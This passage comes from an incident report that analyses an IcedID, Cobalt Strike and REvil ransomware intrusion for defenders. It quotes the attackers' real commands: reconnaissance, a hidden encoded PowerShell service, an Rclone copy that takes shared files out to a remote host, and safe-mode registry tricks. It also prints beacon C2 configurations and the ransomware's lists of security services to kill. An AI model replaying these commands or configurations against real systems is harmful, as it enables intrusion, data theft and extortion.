          - Path: C:\\Windows\\System32\\lsass.exe\n              - Integrity level: System\n              - Access privileges (UAC): Default\n              - Process ID: 592\n              - Command line: lsass.exe\n              - File name: lsass.exe\n              - Full path: C:\\Windows\\System32\\lsass.exe\n              - SHA1: 0fb26350106c9bdd196d4e7d01eb30\n              - SHA256: bbc83e4759d4b82bad31e371ad679a\n              - Signer: Unknown\n```\n\n#### Discovery\n\nInitial discovery by the IcedID malware occurred within minutes of execution:\n\n```\ncmd.exe /c chcp >&2\nWMIC.exe WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get * /Format:List\nipconfig.exe ipconfig /all\nsysteminfo\nnet config workstation\nnltest /domain_trusts\nnltest /domain_trusts /all_trusts\nnet view /all /domain\nnet view /all\nnet.exe net group \"Domain Admins\" /domain\n```\n\nA flurry of LDAP queries were seen coming from `wuauclt.exe` (Cobalt Strike) on the beachhead.\n\n```\n\"DistinguishedName\": \"CN=Terminal Server License Servers,CN=Builtin,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\"\n\"DistinguishedName\": \"CN=RAS and IAS Servers,CN=Users,DC=DomainName,DC=local\", \"ScopeOfSearch\": \"Base\", \"SearchFilter\": \"member=*\"\n...\n```\n\nWe believe that activity was related to a Bloodhound scan, as seconds later we see BloodHound results dropped to disk before being deleted.\n\n```image\nAlt: BloodHound Results\nDescription: The image displays a detailed breakdown of the process 'wuauclt.exe', including various attributes such as execution time, path, integrity level, access privileges, process ID, command line, file name, full path, SHA1, SHA256 hashes, signer, and issuer. Additionally, it shows a created file named 'BloodHound.zip' with its own attributes, including file name, full path, SHA1, SHA256 hashes, and signer information. This information is crucial for understanding the context of the Sodinokibi (REvil) ransomware's discovery phase and its associated activities.\nTranscription: |\n  Process name: wuauclt.exe\n  Execution time: Mar [redacted]\n  Path: c:\\windows\\system32\\wuauclt.exe\n  Integrity level: Medium\n  Access privileges (UAC): Restricted\n  Process ID: 624\n  Command line: WUAUCLT.exe\n  File name: wuauclt.exe\n  Full path: c:\\windows\\system32\\wuauclt.exe\n  SHA1: 58680265bb320f64920f6ec03702dca63b7c2\n  SHA256: efa27c2ee5a31f1fe4a1d59023702560614aa55\n  Signer: Microsoft Windows\n  Issuer: Microsoft Windows Production PCA 2011\n  \n  created file:\n  202103[redacted]_BloodHound.zip\n  File name: 202103[redacted]_BloodHound.zip\n  Full path: C:\\Users\\Public\\202103[redacted]_BloodHound.zip\n  SHA1: 5464e073dd8af58fce96b870587666f6f4c1e\n  SHA256: 2f390719b83dc67b62db8291bdfb80839964\n  Signer: Unknown\n```\n\nOnce on the Exchange server in the environment, the threat actor performed DNS requests for all domain joined systems and pinged a few to check connectivity.\n\nAdFind was executed on a domain controller to gather additional info such as name, OS, and DNS name.\n\n```image\nAlt: AdFind\nDescription: The image displays detailed information about the execution of the AdFind.exe process, including its command line arguments, file paths, and cryptographic hashes (SHA1 and SHA256). It shows the process tree with AdFind.exe as a child of cmd.exe and rundll32.exe, indicating the execution context. The image also includes details such as process ID, integrity level, and access privileges, which are relevant for understanding potential security incidents involving this tool.\nTranscription: |\n  AdFind.exe\n  - Process Name: AdFind.exe\n  - Execution time: [REDACTED]\n  - Path: c:\\users\\public\\adfind.exe\n  - Integrity level: System\n  - Access privileges (UAC): Standard\n  - Process ID: 1068\n  - Command line: adfind.exe -f objectcategory=computer -csv name cn OperatingSystem dNSHostName\n  - File Name: AdFind.exe\n  - Full path: c:\\users\\public\\adfind.exe\n  - SHA1: 4f48fc0f9b47d0ad95d159201fe7e72fbc844\n  - SHA256: c92c158d7c37fea795114fa6491fe5f145ad2f\n  - Signer: Unknown\n  \n  some.csv\n  - File Name: some.csv\n  - Full path: C:\\Users\\Public\\some.csv\n  - SHA1: 1c6e6237597881509769443aa477e1f403\n  - SHA256: 47a71807771fa2c48147ca0f3440a02fdc\n  - Signer: Unknown\n```\n\n```\ncmd.exe /C adfind.exe -f objectcategory=computer -csv name cn OperatingSystem dNSHostName > some.csv\n```\n\n#### Lateral Movement\n\nFor lateral movement, the threat actors used various techniques across the domain, one method being Cobalt Strike.\n\n```image\nAlt: Cobalt Strike Lateral Movement\nDescription: The image is a diagram illustrating the lateral movement of Cobalt Strike within a network. It shows an 'Infected Workstation' connecting to an 'Exchange Server', which then links to 'Domain Controllers', 'Servers', and 'Workstations'. The connections are represented with arrows, indicating the pathways of lateral movement in a compromised environment. The diagram is clearly labeled, making it easy to understand the relationships and flow of potential threats.\nTranscription: |\n  Cobalt Strike Lateral Movement\n  - Infected Workstation\n    - Exchange Server\n      - Domain Controllers\n      - Servers\n      - Workstations\n```\n\nCobalt Strike Beacon executables were transferred using SMB and executed via a remote service.\n\n```image\nAlt: SMB Transfer\nDescription: The image displays a log entry related to a system event, specifically the creation of a file. It includes technical details such as the Process GUID, Process ID, image source (System), and the target filename 'C:\\Windows\\0ddb81e.exe'. This log entry is relevant to monitoring and analyzing potential malicious activity, likely in the context of ransomware deployment.\nTranscription: |\n  data.win.system.level\n  4\n  data.win.system.message\n  \"File created:\n  RuleName: -\n  UtcTime:\n  ProcessGuid: {78E9F60F-D30F-6048-0100-000000000080}\n  ProcessId: 4\n  Image: System\n  TargetFilename: C:\\Windows\\0ddb81e.exe\n  CreationUtcTime:\n```\n\n```image\nAlt: Remote Service Execution\nDescription: The image displays a log entry from a Windows system indicating that a new service was installed. It includes details such as the service name ('@ddb81e'), the service file path ('\\ADMONS\\@ddb81e.exe'), the service type (user mode service), the service start type (demand start), and the service account (LocalSystem). This data is relevant for understanding potential malicious activities, particularly in the context of ransomware attacks like Sodinokibi (REvil), as it shows how threat actors may install services to maintain persistence.\nTranscription: |\n  data.win.system.level 4\n  data.win.system.message \"A service was installed in the system.\n  \n  Service Name: @ddb81e\n  Service File Name: \\\\ADMIN$\\@ddb81e.exe\n  Service Type: user mode service\n  Service Start Type: demand start\n  Service Account: LocalSystem\"\n```\n\n```image\nAlt: PowerShell Execution\nDescription: The image displays a text output that appears to be a service installation log related to a ransomware attack. It includes a service name (39884d), service file path indicating the use of PowerShell with an encoded command, and details about the service type, start type, and service account. The content is highly technical and relevant to cyber threat intelligence, specifically illustrating how a malicious service may be set up within a compromised system.\nTranscription: |\n  \"A service was installed in the system.\n  Service Name: 398843\n  Service File Name: %COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand JABzAD8ATgBlAHcAQQB1AG8AIAAgAEcAIAAgAFAuAG8AbgAIAEwAbgAIAEwAbg...\n```\n\nTo facilitate the final ransomware deployment, RDP connections were initiated from a domain controller as well as a secondary server in the environment.\n\n#### Collection\n\nThe Rclone utility was used to collect information from file shares and to exfiltrate the data.\n\n```\nsvchost.exe --config svchost.conf --progress --no-check-certificate copy \"\\\\ServerName\\C$\\ShareName\" ftp1:/DomainName/FILES/C/ShareName\n```\n\n```image\nAlt: Rclone\nDescription: The image is a screenshot of a command line interface displaying technical details about the Rclone utility. It includes information such as the image path (C:\\Windows\\svchost.exe), file version (1.53.2), description (Rsync for cloud storage), product name (Rclone), company URL (https://rclone.org), and the original filename (rclone.exe). Additionally, it shows the command line used for executing Rclone to copy files from a specified network share to an FTP location.\nTranscription: |\n  Image: C:\\Windows\\svchost.exe\n  FileVersion: 1.53.2\n  Description: Rsync for cloud storage\n  Product: Rclone\n  Company: https://rclone.org\n  OriginalFileName: rclone.exe\n  CommandLine: svchost.exe --config svchost.conf --progress --no-check-certificate copy \"\\\\ServerName\\C$\\ShareName\" ftp1:/DomainName/FILES/C/ShareName\n```\n\n#### Command and Control\n\nIcedID:\n\n- cikawemoret34.space\n- 206.189.10.247:80\n\n```\nnomovee.website\n161.35.109.168:443\nJA3: a0e9f5d64349fb13191bc781f81f42e1\nJA3s: ec74a5c51106f0419184d0dd08fb05bc\n```\n\n**Certificate:**\n\n```\ne0:fc:e5:eb:fd:e7:da:0b:93:ac:dc:df:0d:e8:56:cc:7b:f2:58:43\nNot Before: 2021/03/11 02:06:51\nNot After: 2022/03/11 02:06:51\nIssuer Org: Internet Widgits Pty Ltd\nSubject Common: localhost\nSubject Org: Internet Widgits Pty Ltd\nPublic Algorithm: rsaEncryption\n```\n\nCobalt Strike:\n\n- 45.86.163.78:443\n- cloudmetric.online\n- JA3: a0e9f5d64349fb13191bc781f81f42e1\n- JA3s: ae4edc6faf64d08308082ad26be60767\n\n**Certificate:**\n\n```\nb9:2c:48:71:1a:ba:eb:99:15:c4:0b:b0:31:ce:14:8e:a9:30:ac:d3\nNot Before: 2021/02/27 06:45:42\nNot After: 2021/05/28 07:45:42\nIssuer Org: Let's Encrypt\nSubject Common: cloudmetric.online\nPublic Algorithm: rsaEncryption\n```\n\n**Cobalt Config:**\n\n```\n{\n  \"x64\": {\n    \"config\": {\n      \"HTTP Method Path 2\": \"/jquery-3.2.2.full.js\",\n      \"Beacon Type\": \"0 (HTTP)\",\n      \"Method 2\": \"POST\",\n      \"Polling\": 48963,\n      \"Jitter\": 24,\n      \"Spawn To x64\": \"%windir%\\\\sysnative\\\\WUAUCLT.exe\",\n      \"Spawn To x86\": \"%windir%\\\\syswow64\\\\WUAUCLT.exe\",\n      \"Method 1\": \"GET\",\n      \"C2 Server\": \"cloudmetric.online,/jquery-3.2.2.min.js,45.86.163.78,/jquery-3.2.2.min.js\",\n      \"Port\": 80\n    },\n    \"sha256\": \"8d44894c09a2e30b40927f8951e01708d0a600813387c3c0872bcd6cb10a3e8c\",\n    \"sha1\": \"deab6be62e9c9793f9874bbdec9ff0a3acb82ad8\",\n    \"md5\": \"28ceee1f8f529a80bd0ff5e52240e404\",\n    \"time\": 1615840900656.6\n  },\n  \"x86\": {\n    \"config\": {\n      \"HTTP Method Path 2\": \"/jquery-3.2.2.full.js\",\n      \"Beacon Type\": \"0 (HTTP)\",\n      \"Method 2\": \"POST\",\n      \"Polling\": 48963,\n      \"Jitter\": 24,\n      \"Spawn To x64\": \"%windir%\\\\sysnative\\\\WUAUCLT.exe\",\n      \"Spawn To x86\": \"%windir%\\\\syswow64\\\\WUAUCLT.exe\",\n      \"Method 1\": \"GET\",\n      \"C2 Server\": \"cloudmetric.online,/jquery-3.2.2.min.js,45.86.163.78,/jquery-3.2.2.min.js\",\n      \"Port\": 80\n    },\n    \"sha256\": \"11af3609884ad674a1c86f42ec27719094e935d357d73e574b75c787a0e8c0f1\",\n    \"sha1\": \"a30de5ca8a107fd69c8885a975224ea8ff261002\",\n    \"md5\": \"bbc6592c67d233640a9ca0d0d915003c\",\n    \"time\": 1615840895189\n  }\n}\n```\n\n- 195.189.99.74\n- smalleststores.com\n- JA3: 72a589da586844d7f0818ce684948eea\n- JA3s: ae4edc6faf64d08308082ad26be60767\n\n**Certificate:**\n\n```\n14:f4:79:e3:fd:98:21:60:68:fd:1c:0a:e6:c6:f9:71:f4:ac:f9:df\nNot Before: 2021/03/11 11:02:43\nNot After: 2021/06/09 12:02:43\nIssuer Org: Let's Encrypt\nSubject Common: smalleststores.com\nPublic Algorithm: rsaEncryption\n```\n\n**Cobalt Config:**\n\n```\n{\n  \"x86\": {\n    \"config\": {\n      \"Method 1\": \"GET\",\n      \"Method 2\": \"GET\",\n      \"Spawn To x86\": \"%windir%\\\\syswow64\\\\mstsc.exe\",\n      \"C2 Server\": \"smalleststores.com,/owa/,195.189.99.74,/owa/\",\n      \"Beacon Type\": \"8 (HTTPS)\",\n      \"Polling\": 59713,\n      \"Jitter\": 41,\n      \"Port\": 443,\n      \"Spawn To x64\": \"%windir%\\\\system32\\\\calc.exe\",\n      \"HTTP Method Path 2\": \"/OWA/\"\n    },\n    \"md5\": \"88365eb3d504f570f22d76f777ab2caf\",\n    \"sha256\": \"4b25f708c506e0cc747344ee79ecda48d51f6c25c9cb45ceb420575458f56720\",\n    \"sha1\": \"f42f2eea6cf88d30cfd6207182528be6ae2e504f\",\n    \"time\": 1615846680369.8\n  },\n  \"x64\": {\n    \"config\": {\n      \"Method 1\": \"GET\",\n      \"Method 2\": \"GET\",\n      \"Spawn To x86\": \"%windir%\\\\syswow64\\\\mstsc.exe\",\n      \"C2 Server\": \"smalleststores.com,/owa/,195.189.99.74,/owa/\",\n      \"Beacon Type\": \"8 (HTTPS)\",\n      \"Polling\": 59713,\n      \"Jitter\": 41,\n      \"Port\": 443,\n      \"Spawn To x64\": \"%windir%\\\\system32\\\\calc.exe\",\n      \"HTTP Method Path 2\": \"/OWA/\"\n    },\n    \"md5\": \"27ca24a7f6d02539235d46e689e6e4ac\",\n    \"sha256\": \"e35c31ba3e10f59ae7ea9154e2c0f6f832fcff22b959f65b607d6ba0879ab641\",\n    \"sha1\": \"6885d84c1843c41ff8197d7ab0c8e42e20a7ecaa\",\n    \"time\": 1615846684589\n  }\n}\n```\n\n#### Exfiltration\n\nData that was collected from the domain was exfiltrated to a remote server at:\n\n```\n45.147.160.5:443\n```\n\n```image\nAlt: Exfiltration\nDescription: The image displays a terminal output showing details about a specific executable process related to cloud storage synchronization. It lists various attributes such as the image path (C:\\Windows\\svchost.exe), file version (1.53.2), a description (Rsync for cloud storage), product name (Rclone), company website, original filename (rclone.exe), and the command line used to execute the process. This information is typically relevant to cybersecurity analysis, particularly in identifying potential malicious activity associated with the Sodinokibi (REvil) ransomware.\nTranscription: |\n  Image: C:\\Windows\\svchost.exe\n  FileVersion: 1.53.2\n  Description: Rsync for cloud storage\n  Product: Rclone\n  Company: https://rclone.org\n  OriginalFileName: rclone.exe\n  CommandLine: svchost.exe --config svchost.conf --progress --no-check-certificate copy \"\\\\\\c$\\path\" ftp://user:password@host/path/\n```\n\n```image\nAlt: Exfiltration\nDescription: The image shows a detailed technical analysis related to the Sodinokibi (REvil) ransomware, specifically focusing on the exfiltration process. It includes information about the 'svchost.exe' process, such as its execution time, file path, integrity level, access privileges, and process ID. The command line used for executing 'svchost.exe' is displayed, indicating that it involved a file transfer, likely for data exfiltration. Additionally, the image provides cryptographic hashes (SHA1 and SHA256) for the 'svchost.exe' file, along with the IP address (45.147.160.5) and port (443) to which the connection was established, categorizing it under TCP protocol.\nTranscription: |\n  svchost.exe\n    Process name: svchost.exe\n    Execution time: [REDACTED]\n    Path: c:\\windows\\svchost.exe\n    Integrity level: System\n    Access privileges (UAC): Standard\n    Process ID: 2364\n    Command line: svchost.exe --config svchost.conf --progress --no-check-certificate copy \"\\\\[REDACTED]\\C$\\[REDACTED]\" ftp:1:/C/[REDACTED]\n    File name: svchost.exe\n    Full path: c:\\windows\\svchost.exe\n    SHA1: fcfcf1e45e8d5cdca0450b8dc90754b68e8e\n    SHA256: 538078ab6d80d7cf889af3e08f62c4e83358\n    Signer: Unknown\n  \n  successfully established connection with\n    IP address: 45.147.160.5\n    Port: 443\n    Protocol: Tcp\n```\n\n#### Impact\n\nFor the final actions, the threat actors dropped a ransomware executable on the domain controller in `C:\\Windows` and then used BITSAdmin to deploy the executable to remote systems.\n\n```\nC:\\Windows\\system32\\bitsadmin.exe /transfer debjob /download /priority normal \\\\DOMIANCONTROLLER\\c$\\windows\\DOMAINNAME.exe C:\\Windows\\DOMAINNAME.exe\n```\n\nThe `-smode` flag was used with the ransomware executable to set the system to reboot into Safe Mode with Networking as noted by Malwarehunterteam.\n\n```image\nAlt: smode Execution\nDescription: The image is a flowchart illustrating the execution process of the Sodinokibi (REvil) ransomware in Safe Mode. It depicts the sequence of processes involved, starting from an RDP login and the parent processes like 'explorer.exe' and 'PowerShell.exe'. The flowchart also includes details of child processes such as 'Bitsadmin.exe' and 'DomainName.exe', highlighting the commands used to execute the ransomware and set system configurations. Additionally, it shows how registry values are manipulated to ensure the system reboots into Safe Mode with Networking and later exits it.\nTranscription: |\n  Sodinokibi (aka REvil) smode Execution\n  \n  RDP Login\n  Parent Process\n  C:\\Windows\\explorer.exe / NOUACCHECK\n      |\n      +-- Parent Process\n          PowerShell.exe\n              |\n              +-- Child Process\n                  Bitsadmin.exe\n                      |\n                      +-- Child Process\n                          DomainName.exe\n                              |\n                              +-- C:\\Windows\\DomainName.exe -smode\n                                  System auto reboots into Safe Mode with Networking within seconds of execution\n                              |\n                              +-- bcdeidt.exe\n                                  |\n                                  +-- Registry value set:\n                                      Key: HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n                                      Value name: *AstraZeneca\n                                      Value data: C:\\windows\\DomainName.exe\n                              |\n                              +-- Registry value set:\n                                  Key: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n                                  Value name: *franceisshit\n                                  Value data: bcdeidt /deletevalue {current} safeboot\n```\n\nThe `*franceisshit` key was used to boot the machine out of Safe Mode upon restarting the machine.\n\n```image\nAlt: Registry Key\nDescription: The image depicts a log entry detailing an event related to a ransomware operation. It includes various elements such as the event type ('SetValue'), an image path indicating the location of the executed file, and a unique process ID. Additionally, it references a specific registry key associated with the ransomware's command execution, highlighting the technique used by the threat actors to manipulate system settings for their malicious intent. This information is relevant for understanding the actions and tactics employed by ransomware groups.\nTranscription: |\n  details       : bcdedit /deletevalue {current} safeboot\n  eventType     : SetValue\n  image         : C:\\Windows\\*.exe\n  processGuid   : {b093c253-dfa5-604f-3c07-000000000100}\n  processId     : 6512\n  ruleName      : technique_id=T1547.001, technique_name=Registry Run Keys / Start Folder\n  targetObject  : HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\*franceisshit\n```\n\nThe systems rebooted into Safe Mode with Networking after running this smode command and were left at a login screen. About 10-20 seconds after logging in, all user files were encrypted and a ransom note was placed in numerous locations including the Desktop. Services were not able to be started, which led to collection issues, as normal agents did not start. This also included the startup of EDR and management agents.\n\nWe’ve seen at least one tweet about smode setting auto login keys, but we did not see that in our case and were not able to recreate that situation.\n\nAfter rebooting out of Safe Mode, you are left with the following desktop:\n\n```image\nAlt: Desktop\nDescription: The image is a screenshot of a ransom note displayed in a Notepad window. The note informs the victim that their files are encrypted and currently unavailable, providing instructions on how to recover them. It emphasizes the importance of following the instructions and warns that contacting the attackers is necessary to potentially restore the files. The note includes details on accessing a website via a TOR browser or VPN for further instructions, and it mentions the potential for private data to be published if contact is not made. The overall tone is threatening and demand-driven.\nTranscription: |\n  All of your files are encrypted!\n  Find _________-readme.txt and follow instructions\n  \n  ------ Welcome. Again. ------\n  [+] Whats Happen? [+]\n  Your files are encrypted, and currently unavailable. You can check it: all files on your system has extension ________.\n  By the way, everything is possible to recover (restore), but you need to follow our instructions. Otherwise, you cant return your data (NEVER).\n  \n  ========Attention!!=========\n  Also your private data was downloaded. We will publish it in case you will not get in touch with us asap.\n  ===========================\n  \n  [+] What guarantees? [+]\n  Its just a business. We absolutely do not care about you and your deals, except getting benefits. If we do not do our work and liabilities - nobody will. To check the ability of returning files, You should go to our website. There you can decrypt one file for free. That is our guarantee.\n  If you will not cooperate with our service - for us, it does not matter. But you will lose your time and data, cause just we have the private key.\n  \n  [+] How to get access on website? [+]\n  You have two ways:\n  1) [Recommended] Using a TOR browser!\n     a) Download and install TOR browser from this site: https://torproject.org/\n     b) Open our website: http://___________:929\n  \n  2) If TOR blocked in your country, try to use VPN! But you can use our secondary website. For this:\n     a) Open your any browser (Chrome, Firefox, Opera, IE, Edge)\n     b) Open our secondary website: http://___________\n  \n  Warning: secondary website can be blocked, thats why first variant much better and more available.\n  When you open our website, put the following data in the input form:\n  Key:\n```\n\nOn certain systems, like the domain controllers, the threat actors chose to not use the Safe Mode option, and instead they used a dll executed by `rundll32` to encrypt the system with no reboot, allowing the threat actors to maintain access while the ransomware was encrypting files.\n\n```\nC:\\Windows\\system32\\rundll32.exe\" C:\\Windows\\DomainName.dll,DllRegisterServer\n```\n\n```image\nAlt: rundll32 Execution\nDescription: The image displays a detailed output of a command-line analysis related to the execution of the `rundll32.exe` process. It includes various metadata such as command line, company, current directory, file version, and hashes associated with the process. Additionally, it provides information on the integrity level, logon GUID, logon ID, original file name, and the parent command line and image, indicating that the `rundll32.exe` was executed to register a DLL file during a potential ransomware attack.\nTranscription: |\n  commandLine: 'C:\\Windows\\system32\\rundll32.exe\" C:\\Windows\\...\\DomainName.dll,DllRegisterServer'\n  company: Microsoft Corporation\n  currentDirectory: C:\\Users\\_________\\\n  description: Windows host process (Rundll32)\n  fileVersion: __________\n  hashes:\n    SHA1: F3BA3415D60A8871F285570BEA2E29874CBFF1, MD5: C73BA51880F5A7B20C84185A23212EF, SHA256: __________\n  image: C:\\Windows\\System32\\rundll32.exe\n  integrityLevel: High\n  logonGuid: {4ea529df-c91f-604f-3cb4-a70e00000000}\n  logonId: 0xea7b43c\n  originalFileName: RUNDLL32.EXE\n  parentCommandLine: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'\n  parentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n```\n\nThe threat actors asked for 200k in Monero. They were talked down 20-30% and could have been talked down more. Here’s a few screenshots from the website.\n\n```image\nAlt: Ransom Note\nDescription: The image depicts a ransom note displayed on a computer screen, indicating that the network has been infected by ransomware. It features a prominent red header stating 'Your network has been infected!' along with a brief explanation of the situation. The note assures victims that their files are encrypted and provides instructions on how to purchase a decryption tool, referred to as 'General-Decryptor,' along with a price mention for all PCs on the infected network. Additional sections prompt users to follow instructions, chat support, and details about decryption.\nTranscription: |\n  Your network has been infected!\n  \n  Your documents, photos, databases and other important files encrypted\n  \n  To decrypt your files you need to buy our special software - General-Decryptor\n  \n  Follow the instructions below. But remember that you do not have much time\n  \n  General-Decryptor price\n  the price is for all PCs of your infected network\n  \n  How to decrypt files?\n  You will not be able to decrypt the files yourself. If you try, you will lose your files forever.\n  \n  Buy XMR (no need for verification)\n  - LocalMonero\n```\n\nWith the help of @hatching_io (https://tria.ge/) we were able to parse the config from the ransomware sample.\n\n```image\nAlt: Config\nDescription: The image displays a malware analysis report specifically for the Sodinokibi (REvil) ransomware. It includes general information such as the target file 'DomainName.exe', its size (120KB), and a sample identifier. The report features a score of 10/10, suggesting high severity. Additionally, it lists hashes (MD5, SHA1, SHA256, SHA512) corresponding to the malware, confirming its identity and integrity. The extracted malware configuration section outlines attributes like 'Family' as 'sodinokibi', a 'Botnet', and a 'Campaign ID' of 7114, indicating its operational context.\nTranscription: |\n  {\n    \"General\": {\n      \"Target\": \"DomainName.exe\",\n      \"Size\": \"120KB\",\n      \"Sample\": \"210321-rI7ygjf6sa\",\n      \"Score\": \"10/10\",\n      \"MD5\": \"af94dccb62f97700115a219c4b7626d22\",\n      \"SHA1\": \"bb67edcfe4e5b6fe09ee96e5b8ace7a4cfe39eb7\",\n      \"SHA256\": \"2896b38ec3ff196a9d127dbda3f44c7c29c844f53ae5f209229d56fd6f2a59c\",\n      \"SHA512\": \"08c05fd98aba168734732d043c3e403f531522e0ec64484d15375f353aa23f9654852ad2c54a3e6b2a93\"\n    },\n    \"Malware Config\": {\n      \"Extracted\": {\n        \"Family\": \"sodinokibi\",\n        \"Botnet\": \"$2a$\",\n        \"Campaign\": \"7114\"\n      }\n    }\n  }\n```\n\n```\nCampaign ID (sub): 7114\nnet: false\n```\n\nList of processes to kill (prc):\n\n```\noracle\nklnagent\nmydesktopqos\ninfopath\nBackupExtender\npowerpnt\noutlook\nBackupAgent\nSmc\nsql\nccSvcHst\nBackupUpdater\nRtvscan\nwinword\nkavfsscs\nocssd\nisqlplussvc\nvisio\nShadowProtectSvc\ntbirdconfig\nTSSchBkpService\ndbeng50\nccSetMgr\nagntsvc\nSage.NA.AT_AU.SysTray\ndbsnmp\nthebat\nonenote\nAmitiAvSrv\nwordpad\nmsaccess\navgadmsv\nthunderbird\nBackupMaint\nMicrosoft.exchange.store.worker.exe\nCarboniteUI\nexcel\nSPBBCSvc\nLogmeInBackupService\nencsvc\nocomm\nsqbcoreservice\nNSCTOP\nmydesktopservice\nkavfs\nkavfswp\nocautoupds\nmspub\nxfssvccon\nDLOAdminSvcu\nsynctime\nlmibackupvssservice\nfirefox\nsteam\ndlomaintsvcu\n```\n\nList of services to kill:\n\n```\nTelemetryserver\n\"Sophos AutoUpdate Service\"\nsophos\nAltaro.Agent.exe\nmysqld\nMSSQL$MSGPMR\n\"SophosFIM\"\n\"Sophos Web Control Service\"\nSQLWriter\nsvcGenericHost\nAltiBack\n\"SQLServer Analysis Services (MSSQLSERVER)\"\nBackupExecAgentAccelerator\n\"StorageCraft ImageReady\"\nSQLTELEMETRY\nAzureADConnectAuthenticationAgent\nntrtscan\nds_notifier\nTeamViewer\n\"StorageCraft Raw Agent\"\n\"StorageCraft Shadow Copy Provider\"\nSQLTELEMETRY$SQLEXPRESS\nVeeamHvIntegrationSvc\nAltiCTProxy\nMsDtsServer130\nViprePPLSvc\nMcAfeeFramework\nMSSQL$QM\n\"swi_service\"\n\"ThreadLocker\"\nofcservice\nAUService\nsophossps\nAzureADConnectHealthSyncMonitor\nAltaro.OffsiteServer.UI.Service.exe\n\"SAVAdminService\"\nds_monitor\nALTIVRM\nSSASTELEMETRY\nTmCCSF\nMsDtsServer110\n\"Sophos MCS Client\"\nTMBMServer\nSBAMSvc\nmfewc\n\"Sophos System Protection Service\"\nMSSQLFDLauncher$TESTBACKUP02DEV\nVeeamDeploymentService\nmasvc\nbackup\nMSSQL$SQLEXPRESS\nAltiPhoneServ\nMSSQLServerOLAPService\nSSISTELEMETRY130\nVeeamEndpointBackupSvc\nmepocs\nAltaro.UI.Service.exe\n\"ds_agent\"\nHuntressUpdater\nMSSQLFDLauncher\n\"Sophos File Scanner Service\"\nSQLAgent$MSGPMR\nADSync\nKaseyaAgent\nReportServer\nMSSQLFDLauncher$SQLEXPRESS\nMSSQL$HPWJA\nKaseyaAgentEndpoint\nVeeamTransportSvc\n\"ds_monitor\"\nmfevtp\nMSSQLTESTBACKUP02DEV\nSQLTELEMETRY$MSGPMR\nThreadLocker\nMSSQLServerADHelper100\nveeam\ntmlisten\nAzureADConnectHealthSyncInsights\n\"swi_filter\"\nMsDtsServer120\nProtectedStorage\nVeeamDeploySvc\nmemtas\nds_agent\nVeeamMountSvc\nHuntressAgent\nSQLAgent$SQLEXPRESS\nbedbg\nMSSQLSERVER\n\"ofcservice\"\nVipreAAPSvc\n\"Sophos Endpoint Defense Service\"\nKACHIPS906995744173948\nDsSvc\nMSSQLLaunchpad$SQLEXPRESS\nmsseces\nmacmnsvc\nLTService\nCode42Service\nAltaro.HyperV.WAN.RemoteService.exe\nLTSvcMon\nMSSQL$SQLEXPRESSADV\n\"SAVService\"\nAltaro.OffsiteServer.Service.exe\n\"Sage 100cloud Advanced 2020 (9920)\"\nAltaro.SubAgent.exe\nmfemms\n\"TeamViewer\"\n\"SQLServer Reporting Services (MSSQLSERVER)\"\nVSS\nsql\nAltaro.SubAgent.N2.exe\n\"SQLServer Integration Services 12.0\"\nSQLSERVERAGENT\nvss\n\"Sophos Safestore Service\"\nklnagent\n\"Sage.NA.AT_AU.Service\"\nMBAMService\n\"Sophos Health Service\"\nSQLBrowser\nMySQL\n\"ProtectedStorage\"\n\"Sophos Clean Service\"\n\"Sage 100c Advanced 2017 (9917)\"\n\"SntpService\"\nVeeamNFSSvc\nKAVFS\nSQLEXPRESSADV\nKAENDCHIPS906995744173948\nsppsvc\nAmsp\npsqlWGE\nMicrosoft.exchange.store.worker.exe\nkavfsscs\n\"Amsp\"\nsqlservr\nAltaro.DedupService.exe\nsvc$\n\"ds_notifier\"\n\"Sophos Device Control Service\"\nAzureADConnectAgentUpdater\nAltiFTPUploader\n\"Sophos MCS Agent\"\n```\n\nTriage sandbox run of the executable without smode:\n\n```image\nAlt: Triage Sandbox\nDescription: The image displays a detailed dashboard or report related to the Sodinokibi (REvil) ransomware, focusing on various signatures and processes associated with it. It features a list of signatures categorized by their effects, such as 'Collection,' 'Credential Access,' 'Defense Evasion,' 'Discovery,' 'Impact,' and 'Persistence.' The signature for the Sodinokibi ransomware is highlighted in red, indicating a significant impact. Additionally, the image lists specific processes, including their file paths, relevant to the ransomware's execution and behavior on the compromised system.\nTranscription: |\n  # Signatures\n  Filter: none\n  - Sodin,Sodinokibi,REvil\n  - Modifies extensions of user files\n  - Reads user/profile data of web browsers\n  - Adds Run key to start application\n  - Enumerates connected drives\n  - Sets desktop wallpaper using registry\n  - Drops file in Program Files directory\n  - Suspicious behavior: EnumeratesProcesses\n  - Suspicious use of AdjustPrivilegeToken\n  \n  # Processes\n  - C:\\Users\\Admin\\AppData\\Local\\Temp\\DomainName.exe\n    - Modifies extensions of user files\n    - Adds Run key to start application\n    - Enumerates connected drives\n    - Drops file in Program Files directory\n    - Suspicious behavior: EnumeratesProcesses\n    - Suspicious use of AdjustPrivilegeToken\n  \n  - C:\\Windows\\system32\\wbem\\unsecapp.exe\n  - C:\\Windows\\system32\\svsvc.exe\n```\n\n### IOCs\n\n#### Network\n\n```\n45.86.163.78|80\n45.86.163.78|443\n45.86.163.78|8080\n195.189.99.74|80\n195.189.99.74|443\n195.189.99.74|8080\n206.189.10.247|80\n161.35.109.168|443\nsmalleststores.com\ncloudmetric.online\ncikawemoret34.space\nnomovee.website\n```\n\n#### 